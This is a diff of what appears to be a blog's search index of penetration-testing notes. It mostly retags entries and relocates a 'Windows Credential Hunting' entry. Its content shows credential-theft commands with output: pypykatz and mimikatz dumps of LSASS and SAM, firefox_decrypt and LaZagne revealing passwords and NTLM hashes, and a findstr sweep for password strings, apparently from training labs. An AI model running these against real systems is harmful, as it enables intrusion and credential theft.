@@ -107,6 +107,7 @@
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pypykatz lsa minidump lsass.dmp </span><br></pre></td></tr></table></figure>]]></content>
       <categories>
         <category>Active Directory</category>
+        <category>Windows</category>
         <category>Post-Exploitation</category>
         <category>Dump-Passwords</category>
       </categories>
@@ -143,6 +144,7 @@
 ]]></content>
       <categories>
         <category>Active Directory</category>
+        <category>Windows</category>
         <category>Post-Exploitation</category>
         <category>Dump-Passwords</category>
       </categories>
@@ -181,6 +183,7 @@
 <h3 id="Locally"><a href="#Locally" class="headerlink" title="Locally"></a>Locally</h3><h5 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># lsadump::sam</span></span><br></pre></td></tr></table></figure>]]></content>
       <categories>
         <category>Active Directory</category>
+        <category>Windows</category>
         <category>Post-Exploitation</category>
         <category>Dump-Passwords</category>
       </categories>
@@ -214,6 +217,7 @@
 
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -la /etc/cron.*/</span><br><span class="line"></span><br><span class="line">/etc/cron.d/:</span><br><span class="line">total 28</span><br><span class="line">drwxr-xr-x 1 root root  106  3. Jan 20:27 .</span><br><span class="line">drwxr-xr-x 1 root root 5728  1. Feb 00:06 ..</span><br><span class="line">-rw-r--r-- 1 root root  201  1. Mär 2021  e2scrub_all</span><br><span class="line">-rw-r--r-- 1 root root  331  9. Jan 2021  geoipupdate</span><br><span class="line">-rw-r--r-- 1 root root  607 25. Jan 2021  john</span><br><span class="line">-rw-r--r-- 1 root root  589 14. Sep 2020  mdadm</span><br><span class="line">-rw-r--r-- 1 root root  712 11. Mai 2020  php</span><br><span class="line">-rw-r--r-- 1 root root  102 22. Feb 2021  .placeholder</span><br><span class="line">-rw-r--r-- 1 root root  396  2. Feb 2021  sysstat</span><br><span class="line"></span><br><span class="line">/etc/cron.daily/:</span><br><span class="line">total 68</span><br><span class="line">drwxr-xr-x 1 root root  252  6. Jan 16:24 .</span><br><span class="line">drwxr-xr-x 1 root root 5728  1. Feb 00:06 ..</span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>]]></content>
       <categories>
+        <category>Active Directory</category>
         <category>Linux</category>
         <category>Post-Exploitation</category>
         <category>Credential Hunting</category>
@@ -250,6 +254,7 @@
 <h4 id="Decrypt"><a href="#Decrypt" class="headerlink" title="Decrypt"></a>Decrypt</h4><p>To decrypt saved credentials we can use <a href="https://github.com/unode/firefox_decrypt">firefox_decrypt</a></p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3.9 firefox_decrypt.py</span><br><span class="line"></span><br><span class="line">Select the Mozilla profile you wish to decrypt</span><br><span class="line">1 -&gt; lfx3lvhb.default</span><br><span class="line">2 -&gt; 1bplpd86.default-release</span><br><span class="line"></span><br><span class="line">2</span><br><span class="line"></span><br><span class="line">Website:   https://testing.dev.inlanefreight.com</span><br><span class="line">Username: <span class="string">&#x27;test&#x27;</span></span><br><span class="line">Password: <span class="string">&#x27;test&#x27;</span></span><br><span class="line"></span><br><span class="line">Website:   https://www.inlanefreight.com</span><br><span class="line">Username: <span class="string">&#x27;cry0l1t3&#x27;</span></span><br><span class="line">Password: <span class="string">&#x27;FzXUxJemKm6g2lGh&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
       <categories>
+        <category>Active Directory</category>
         <category>Linux</category>
         <category>Post-Exploitation</category>
         <category>Credential Hunting</category>
@@ -466,6 +471,54 @@
       </tags>
   </entry>
   <entry>
+    <title>Windows Credential Hunting</title>
+    <url>/2025/11/26/Windows-Credential-Hunting/</url>
+    <content><![CDATA[<h2 id="Common-Password-Location"><a href="#Common-Password-Location" class="headerlink" title="Common Password Location"></a>Common Password Location</h2><ul>
+<li><code>C:\Users\ALA\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code></li>
+<li><code>Passwords in Group Policy in the SYSVOL share</code></li>
+<li><code>Passwords in scripts in the SYSVOL share</code></li>
+<li><code>Password in scripts on IT shares</code></li>
+<li><code>Passwords in web.config files on dev machines and IT shares</code></li>
+<li><code>Password in unattend.xml</code></li>
+<li><code>Passwords in the AD user or computer description fields</code></li>
+<li><code>KeePass databases (if we are able to guess or crack the master password)</code></li>
+<li><code>Found on user systems and shares</code></li>
+<li><code>Files with names like pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, and Sharepoint</code></li>
+</ul>
+<h2 id="LaZagne"><a href="#LaZagne" class="headerlink" title="LaZagne"></a>LaZagne</h2><p>Normal User Access : </p>
+<ul>
+<li><code>Browser passwords (Chrome / Edge / Firefox)</code></li>
+<li><code>Application credentials</code></li>
+<li><code>Wifi passwords</code></li>
+<li><code>Chat app passwords</code></li>
+<li><code>Mail client passwords</code></li>
+<li><code>Windows Credential Manager secrets (current user only)</code></li>
+</ul>
+<p>Administrator Access :</p>
+<ul>
+<li><code>LSASS</code></li>
+<li><code>LSA</code></li>
+<li><code>KeePass memory extraction</code></li>
+</ul>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">bob</span>\<span class="title">Desktop</span>&gt; <span class="title">start</span> <span class="title">LaZagne.exe</span> <span class="title">all</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Administrator</span>:500:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span></span><br><span class="line"><span class="function"><span class="title">Guest</span>:501:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span></span><br><span class="line"><span class="function"><span class="title">DefaultAccount</span>:503:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span></span><br><span class="line"><span class="function"><span class="title">WDAGUtilityAccount</span>:504:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:72639<span class="title">bbb94990305b5a015220f8de34e</span>:::</span></span><br><span class="line"><span class="function"><span class="title">bob</span>:1001:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:3<span class="title">c0e5d303ec84884ad5c3b7876a06ea6</span>:::</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">########## <span class="title">User</span>: <span class="title">bob</span> ##########</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">------------------- <span class="title">Winscp</span> <span class="title">passwords</span> -----------------</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">[+] <span class="title">Password</span> <span class="title">found</span> !!!</span></span><br><span class="line"><span class="function"><span class="title">URL</span>: 10.129.202.64</span></span><br><span class="line"><span class="function"><span class="title">Login</span>: <span class="title">ubuntu</span></span></span><br><span class="line"><span class="function"><span class="title">Password</span>: <span class="title">FSadmin123</span></span></span><br><span class="line"><span class="function"><span class="title">Port</span>: 22</span></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Search-for-File-Content-findstr"><a href="#Search-for-File-Content-findstr" class="headerlink" title="Search for File Content - findstr"></a>Search for File Content - findstr</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">findstr /SIM /C:<span class="string">&quot;password&quot;</span> /C:<span class="string">&quot;passphrase&quot;</span> /C:<span class="string">&quot;key&quot;</span> /C:<span class="string">&quot;username&quot;</span> /C:<span class="string">&quot;user account&quot;</span> /C:<span class="string">&quot;creds&quot;</span> /C:<span class="string">&quot;users&quot;</span> /C:<span class="string">&quot;passkeys&quot;</span> /C:<span class="string">&quot;configuration&quot;</span> /C:<span class="string">&quot;dbcredential&quot;</span> /C:<span class="string">&quot;dbpassword&quot;</span> /C:<span class="string">&quot;pwd&quot;</span> /C:<span class="string">&quot;login&quot;</span> /C:<span class="string">&quot;credentials&quot;</span> *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml</span><br></pre></td></tr></table></figure>
+
+
+]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Post-Exploitation</category>
+        <category>Credential Hunting</category>
+      </categories>
+      <tags>
+        <tag>Lazagne</tag>
+        <tag>Search-for-File-Content</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Pivoting And Port Forwarding</title>
     <url>/2025/11/22/Pivoting-And-Port-Forwarding/</url>
     <content><![CDATA[<p>n &#x3D; Our Attacker Machine</p>
@@ -620,54 +673,6 @@
         <tag>socat</tag>
         <tag>Reverse-Port-Forwarding</tag>
         <tag>Chisel</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Windows Credential Hunting</title>
-    <url>/2025/11/26/Windows-Credential-Hunting/</url>
-    <content><![CDATA[<h2 id="Common-Password-Location"><a href="#Common-Password-Location" class="headerlink" title="Common Password Location"></a>Common Password Location</h2><ul>
-<li><code>C:\Users\ALA\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code></li>
-<li><code>Passwords in Group Policy in the SYSVOL share</code></li>
-<li><code>Passwords in scripts in the SYSVOL share</code></li>
-<li><code>Password in scripts on IT shares</code></li>
-<li><code>Passwords in web.config files on dev machines and IT shares</code></li>
-<li><code>Password in unattend.xml</code></li>
-<li><code>Passwords in the AD user or computer description fields</code></li>
-<li><code>KeePass databases (if we are able to guess or crack the master password)</code></li>
-<li><code>Found on user systems and shares</code></li>
-<li><code>Files with names like pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, and Sharepoint</code></li>
-</ul>
-<h2 id="LaZagne"><a href="#LaZagne" class="headerlink" title="LaZagne"></a>LaZagne</h2><p>Normal User Access : </p>
-<ul>
-<li><code>Browser passwords (Chrome / Edge / Firefox)</code></li>
-<li><code>Application credentials</code></li>
-<li><code>Wifi passwords</code></li>
-<li><code>Chat app passwords</code></li>
-<li><code>Mail client passwords</code></li>
-<li><code>Windows Credential Manager secrets (current user only)</code></li>
-</ul>
-<p>Administrator Access :</p>
-<ul>
-<li><code>LSASS</code></li>
-<li><code>LSA</code></li>
-<li><code>KeePass memory extraction</code></li>
-</ul>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">bob</span>\<span class="title">Desktop</span>&gt; <span class="title">start</span> <span class="title">LaZagne.exe</span> <span class="title">all</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Administrator</span>:500:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span></span><br><span class="line"><span class="function"><span class="title">Guest</span>:501:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span></span><br><span class="line"><span class="function"><span class="title">DefaultAccount</span>:503:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span></span><br><span class="line"><span class="function"><span class="title">WDAGUtilityAccount</span>:504:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:72639<span class="title">bbb94990305b5a015220f8de34e</span>:::</span></span><br><span class="line"><span class="function"><span class="title">bob</span>:1001:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:3<span class="title">c0e5d303ec84884ad5c3b7876a06ea6</span>:::</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">########## <span class="title">User</span>: <span class="title">bob</span> ##########</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">------------------- <span class="title">Winscp</span> <span class="title">passwords</span> -----------------</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">[+] <span class="title">Password</span> <span class="title">found</span> !!!</span></span><br><span class="line"><span class="function"><span class="title">URL</span>: 10.129.202.64</span></span><br><span class="line"><span class="function"><span class="title">Login</span>: <span class="title">ubuntu</span></span></span><br><span class="line"><span class="function"><span class="title">Password</span>: <span class="title">FSadmin123</span></span></span><br><span class="line"><span class="function"><span class="title">Port</span>: 22</span></span><br></pre></td></tr></table></figure>
-
-
-<h2 id="Search-for-File-Content-findstr"><a href="#Search-for-File-Content-findstr" class="headerlink" title="Search for File Content - findstr"></a>Search for File Content - findstr</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">findstr /SIM /C:<span class="string">&quot;password&quot;</span> /C:<span class="string">&quot;passphrase&quot;</span> /C:<span class="string">&quot;key&quot;</span> /C:<span class="string">&quot;username&quot;</span> /C:<span class="string">&quot;user account&quot;</span> /C:<span class="string">&quot;creds&quot;</span> /C:<span class="string">&quot;users&quot;</span> /C:<span class="string">&quot;passkeys&quot;</span> /C:<span class="string">&quot;configuration&quot;</span> /C:<span class="string">&quot;dbcredential&quot;</span> /C:<span class="string">&quot;dbpassword&quot;</span> /C:<span class="string">&quot;pwd&quot;</span> /C:<span class="string">&quot;login&quot;</span> /C:<span class="string">&quot;credentials&quot;</span> *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml</span><br></pre></td></tr></table></figure>
-
-
-]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Post-Exploitation</category>
-        <category>Credential Hunting</category>
-      </categories>
-      <tags>
-        <tag>Lazagne</tag>
-        <tag>Search-for-File-Content</tag>
       </tags>
   </entry>
 </search>
